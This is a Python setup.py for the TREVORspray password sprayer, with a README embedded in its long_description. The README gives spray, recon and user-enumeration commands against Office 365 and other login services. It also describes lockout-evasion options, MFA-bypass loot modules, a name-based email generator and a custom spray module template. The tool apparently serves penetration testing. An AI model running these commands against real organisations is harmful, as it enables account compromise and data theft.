# -*- coding: utf-8 -*-
from setuptools import setup

packages = \
['trevorspray',
 'trevorspray.lib',
 'trevorspray.lib.enumerators',
 'trevorspray.lib.looters',
 'trevorspray.lib.sprayers',
 'trevorspray.lib.util']

package_data = \
{'': ['*']}

install_requires = \
['PySocks>=1.7.1,<2.0.0',
 'Pygments>=2.10.0,<3.0.0',
 'beautifulsoup4>=4.10.0,<5.0.0',
 'exchangelib>=4.6.1,<5.0.0',
 'sh>=1.14.2,<2.0.0',
 'tldextract>=3.1.2,<4.0.0',
 'trevorproxy>=1.0.5,<2.0.0']

entry_points = \
{'console_scripts': ['trevorspray = trevorspray.cli:main']}

setup_kwargs = {
    'name': 'trevorspray',
    'version': '2.0.6a0',
    'description': 'A modular password sprayer with threading, SSH proxying, loot modules, and more',
    'long_description': '# TREVORspray 2.0\nTREVORspray is a modular password sprayer with threading, SSH proxying, loot modules, and more!\n\nBy [@thetechr0mancer](https://twitter.com/thetechr0mancer)\n\n[![License](https://img.shields.io/badge/license-GPLv3-blue.svg)](https://raw.githubusercontent.com/blacklanternsecurity/nmappalyzer/master/LICENSE)\n[![Python Version](https://img.shields.io/badge/python-3.6+-blue)](https://www.python.org)\n\n## Installation:\n~~~bash\npip install git+https://github.com/blacklanternsecurity/trevorproxy\npip install git+https://github.com/blacklanternsecurity/trevorspray\n~~~\n\nSee the accompanying [**Blog Post**](blogpost.md) for a fun rant and some cool demos!\n\n![trevorspray-demo](https://user-images.githubusercontent.com/20261699/149219712-8549e15c-2eee-4d7a-a615-e8882b693c3f.gif)\n\n## Features\n- Threads, lots of threads\n- Multiple modules\n  - `msol` (Office 365)\n  - `adfs` (Active Directory Federation Services)\n  - `owa` (Outlook Web App)\n  - `okta` (Okta SSO)\n  - `anyconnect` (Cisco VPN)\n  - custom modules (easy to make!)\n- Tells you the status of each account: if it exists, is locked, has MFA enabled, etc.\n- Automatic cancel/resume (remembers already-tried user/pass combos in `~/.trevorspray/tried_logins.txt`)\n- Round-robin proxy through multiple IPs with `--ssh` or `--subnet`\n- Automatic infinite reconnect/retry if a proxy goes down (or if you lose internet)\n- Spoofs `User-Agent` and other signatures to look like legitimate auth traffic\n- Comprehensive logging\n- Optional `--delay`, `--jitter`, and `--lockout-delay` between requests to bypass lockout countermeasures\n- IPv6 support\n- O365 MFA bypass support (disable with `--no-loot`)\n  - IMAP\n  - SMTP\n  - POP\n  - EWS (Exchange Web Services) - Automatically retrieves GAL (Global Address Book)\n  - EAS (Exchange ActiveSync)\n    - Recommended bypass: BlueMail Android app\n  - EXO (Exchange Online PowerShell)\n  - UM (Exchange Unified Messaging)\n  - AutoDiscover - Automatically retrieves OAB (Offline Address Book)\n  - Azure Portal Access\n- Domain `--recon` with the following features:\n  - list MX/TXT records\n  - list O365 info\n    - tenant ID\n    - tenant name\n    - other tentant domains\n    - sharepoint URL\n    - authentication urls, autodiscover, federation config, etc.\n  - User enumeration (use `--recon` and `--users`):\n    - `OneDrive`\n    - `Azure Seamless SSO`\n\n## How To - O365\n- First, get a list of emails for `corp.com` and perform a spray to see if the default configuration works. Usually it does.\n- If TREVORspray says the emails in your list don\'t exist, don\'t give up. Get the `token_endpoint` with `--recon corp.com`. The `token_endpoint` is the URL you\'ll be spraying against (with the `--url` option).\n- It may take some experimentation before you find the right combination of `token_endpoint` + email format.\n    - For example, if you\'re attacking `corp.com`, it may not be as easy as spraying `corp.com`. You may find that Corp\'s parent company Evilcorp owns their Azure tenant, meaning that you need to spray against `evilcorp.com`\'s `token_endpoint`. Also, you may find that `corp.com`\'s internal domain `corp.local` is used instead of `corp.com`.\n    - So in the end, instead of spraying `bob@corp.com` against `corp.com`\'s `token_endpoint`, you\'re spraying `bob@corp.local` against `evilcorp.com`\'s.\n\n## Example: Perform recon against a domain (retrieves tenant info, autodiscover, mx records, etc.)\n```bash\ntrevorspray --recon evilcorp.com\n...\n    "token_endpoint": "https://login.windows.net/b439d764-cafe-babe-ac05-2e37deadbeef/oauth2/token"\n...\n```\n\n## Example: Enumerate users via OneDrive (no failed logins)\n```bash\ntrevorspray --recon evilcorp.com -u emails.txt --threads 10\n```\n\n![recon-user-enumeration](https://user-images.githubusercontent.com/20261699/151052308-d938bf6c-f335-4d3e-9c3c-1fd79a188e73.gif)\n\n## Example: Spray against discovered "token_endpoint" URL\n```bash\ntrevorspray -u emails.txt -p \'Welcome123\' --url https://login.windows.net/b439d764-cafe-babe-ac05-2e37deadbeef/oauth2/token\n```\n\n## Example: Spray with 5-second delay between requests\n```bash\ntrevorspray -u bob@evilcorp.com -p \'Welcome123\' --delay 5\n```\n\n## Example: Spray and round-robin between 3 IPs (the current IP is also used, unless `-n` is specified)\n```bash\ntrevorspray -u emails.txt -p \'Welcome123\' --ssh root@1.2.3.4 root@4.3.2.1\n```\n\n## Example: Find valid usernames without OSINT >:D\n```bash\n# clone wordsmith dataset\nwget https://github.com/skahwah/wordsmith/releases/download/v2.1.1/data.tar.xz && tar -xvf data.tar.xz && cd data\n\n# order first initial by occurrence\nordered_letters=asjmkdtclrebnghzpyivfowqux\n\n# loop through first initials\necho -n $ordered_letters | while read -n1 f; do\n  # loop through top 2000 USA last names\n  head -n 2000 \'usa/lnames.txt\' | while read last; do\n    # generate emails in f.last format\n    echo "${f}.${last}@evilcorp.com"\n  done\ndone | tee f.last.txt\n\ntrevorspray -u f.last.txt -p \'Welcome123\'\n```\n\n## Extract data from downloaded LZX files\nWhen TREVORspray successfully bypasses MFA and retrieves an Offline Address Book (OAB), the address book is downloaded in LZX format to `~/.trevorspray/loot`. LZX is an ancient and obnoxious compression algorithm used by Microsoft.\n~~~bash\n# get libmspack (for extracting LZX file)\ngit clone https://github.com/kyz/libmspack\ncd libmspack/libmspack/\n./rebuild.sh\n./configure\nmake\n\n# extract LZX file\n./examples/.libs/oabextract ~/.trevorspray/loot/deadbeef-ce01-4ec9-9d08-1050bdc41131-data-1.lzx oab.bin\n# extract all strings\nstrings oab.bin\n# extract and dedupe emails\negrep -oa \'[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\\.[A-Za-z]{2,6}\' oab.bin | tr \'[:upper:]\' \'[:lower:]\' | sort -u\n~~~\n\n## TREVORspray - Help:\n```\n$ trevorspray --help\nusage: trevorspray [-h] [-m {owa,okta,anyconnect,adfs,msol}] [-u USERS [USERS ...]] [-p PASSWORDS [PASSWORDS ...]] [--url URL] [-r DOMAIN] [-t THREADS] [-f] [-d DELAY]\n                   [-ld LOCKOUT_DELAY] [-j JITTER] [-e] [-nl] [--ignore-lockouts] [--timeout TIMEOUT] [--random-useragent] [-6] [--proxy PROXY] [-v] [-s USER@SERVER [USER@SERVER ...]]\n                   [-i KEY] [-b BASE_PORT] [-n] [--interface INTERFACE] [--subnet SUBNET]\n\nA password sprayer with the option to load-balance traffic through SSH hosts\n\noptional arguments:\n  -h, --help            show this help message and exit\n\nbasic arguments:\n  -m {owa,okta,anyconnect,adfs,msol}, --module {owa,okta,anyconnect,adfs,msol}\n                        Spray module to use (default: msol)\n  -u USERS [USERS ...], --users USERS [USERS ...]\n                        Usernames(s) and/or file(s) containing usernames\n  -p PASSWORDS [PASSWORDS ...], --passwords PASSWORDS [PASSWORDS ...]\n                        Password(s) that will be used to perform the password spray\n  --url URL             The URL to spray against\n  -r DOMAIN, --recon DOMAIN, --enumerate DOMAIN\n                        Retrieves MX records and info related to authentication, email, Azure, Microsoft 365, etc. If --usernames are specified, this also enables username enumeration.\n\nadvanced arguments:\n  Round-robin traffic through remote systems via SSH (overrides --threads)\n\n  -t THREADS, --threads THREADS\n                        Max number of concurrent requests (default: 1)\n  -f, --force           Try all usernames/passwords even if they\'ve been tried before\n  -d DELAY, --delay DELAY\n                        Sleep for this many seconds between requests\n  -ld LOCKOUT_DELAY, --lockout-delay LOCKOUT_DELAY\n                        Sleep for this many additional seconds when a lockout is encountered\n  -j JITTER, --jitter JITTER\n                        Add a random delay of up to this many seconds between requests\n  -e, --exit-on-success\n                        Stop spray when a valid cred is found\n  -nl, --no-loot        Don\'t execute loot activites for valid accounts\n  --ignore-lockouts     Forces the spray to continue and not stop when multiple account lockouts are detected\n  --timeout TIMEOUT     Connection timeout in seconds (default: 10)\n  --random-useragent    Add a random value to the User-Agent for each request\n  -6, --prefer-ipv6     Prefer IPv6 over IPv4\n  --proxy PROXY         Proxy to use for HTTP and HTTPS requests\n  -v, --verbose, --debug\n                        Show which proxy is being used for each request\n\nSSH Proxy:\n  Round-robin traffic through remote systems via SSH (overrides --threads)\n\n  -s USER@SERVER [USER@SERVER ...], --ssh USER@SERVER [USER@SERVER ...]\n                        Round-robin load-balance through these SSH hosts (user@host) NOTE: Current IP address is also used once per round\n  -i KEY, -k KEY, --key KEY\n                        Use this SSH key when connecting to proxy hosts\n  -b BASE_PORT, --base-port BASE_PORT\n                        Base listening port to use for SOCKS proxies\n  -n, --no-current-ip   Don\'t spray from the current IP, only use SSH proxies\n\nSubnet Proxy:\n  Send traffic from random addresses within IP subnet\n\n  --interface INTERFACE\n                        Interface to send packets on\n  --subnet SUBNET       Subnet to send packets from\n```\n\n## Writing your own Spray Modules\nIf you need to spray a service/endpoint that\'s not supported yet, you can write your own spray module! This is a great option because custom modules benefit from all of TREVORspray\'s features -- e.g. proxies, delay, jitter, etc.\n\nWriting your own spray module is pretty straightforward. Create a new `.py` file in `lib/sprayers` (e.g. `lib/sprayers/custom_sprayer.py`), and create a class that inherits from `BaseSprayModule`. You can call the class whatever you want. Fill out the HTTP method and any other parameters that you need in the requests (you can reference `lib/sprayers/base.py` or any of the other modules for examples).\n  - You only need to implement one method on your custom class: `check_response()`. This method evaluates the HTTP response to determine whether the login was successful.\n  - Once you\'re finished, you can use the custom spray module by specifying the name of your python file (without the `.py`) on the command line, e.g. `trevorspray -m custom_sprayer -u users.txt -p Welcome123`.\n~~~python\n# Example spray module\n\nfrom .base import BaseSprayModule\n\nclass SprayModule(BaseSprayModule):\n\n    # HTTP method\n    method = \'POST\'\n    # default target URL\n    default_url = \'https://login.evilcorp.com/\'\n    # body of request\n    request_data = \'user={username}&pass={password}&group={otherthing}\'\n    # HTTP headers\n    headers = {}\n    # HTTP cookies\n    cookies = {}\n    # Don\'t count nonexistent accounts as failed logons\n    fail_nonexistent = False\n\n    headers = {\n        \'User-Agent\': \'Your Moms Smart Vibrator\',\n    }\n\n    def initialize(self):\n        \'\'\'\n        Get additional arguments from user at runtime\n        NOTE: These can also be passed via environment variables beginning with "TREVOR_":\n            TREVOR_otherthing=asdf\n        \'\'\'\n        while not self.trevor.runtimeparams.get(\'otherthing\', \'\'):\n            self.trevor.runtimeparams.update({\n                \'otherthing\': input("What\'s that other thing? ")\n            })\n\n        return True\n\n\n    def check_response(self, response):\n        \'\'\'\n        returns (valid, exists, locked, msg)\n        \'\'\'\n\n        valid = False\n        exists = None\n        locked = None\n        msg = \'\'\n\n        if getattr(response, \'status_code\', 0) == 200:\n            valid = True\n            exists = True\n            msg = \'Valid cred\'\n\n        return (valid, exists, locked, msg)\n~~~\n\nCREDIT WHERE CREDIT IS DUE - MANY THANKS TO:\n- [@dafthack](https://twitter.com/dafthack) for writing [MSOLSpray](https://github.com/dafthack/MSOLSpray)\n- [@Mrtn9](https://twitter.com/Mrtn9) for his Python port of [MSOLSpray](https://github.com/MartinIngesen/MSOLSpray)\n- [@KnappySqwurl](https://twitter.com/KnappySqwurl) for being a splunk wizard\n- [@CarsonSallis](https://github.com/CarsonSallis) for the O365 MFA bypasses\n- [@DrAzureAD](https://twitter.com/DrAzureAD) for the Azure AD recon features ([AADInternals](https://github.com/Gerenios/AADInternals))\n- [@nyxgeek](https://twitter.com/nyxgeek) for the OneDrive user enumeration ([onedrive_user_enum](https://github.com/nyxgeek/onedrive_user_enum))\n- [@gremwell](https://twitter.com/gremwell) for the Seamless SSO user enumeration ([o365enum](https://github.com/gremwell/o365enum))\n\n![trevor](https://user-images.githubusercontent.com/20261699/92336575-27071380-f070-11ea-8dd4-5ba42c7d04b7.jpeg)\n\n`#trevorforget`',
    'author': 'TheTechromancer',
    'author_email': None,
    'maintainer': None,
    'maintainer_email': None,
    'url': 'https://github.com/blacklanternsecurity/TREVORspray',
    'packages': packages,
    'package_data': package_data,
    'install_requires': install_requires,
    'entry_points': entry_points,
    'python_requires': '>=3.6,<4.0',
}


setup(**setup_kwargs)
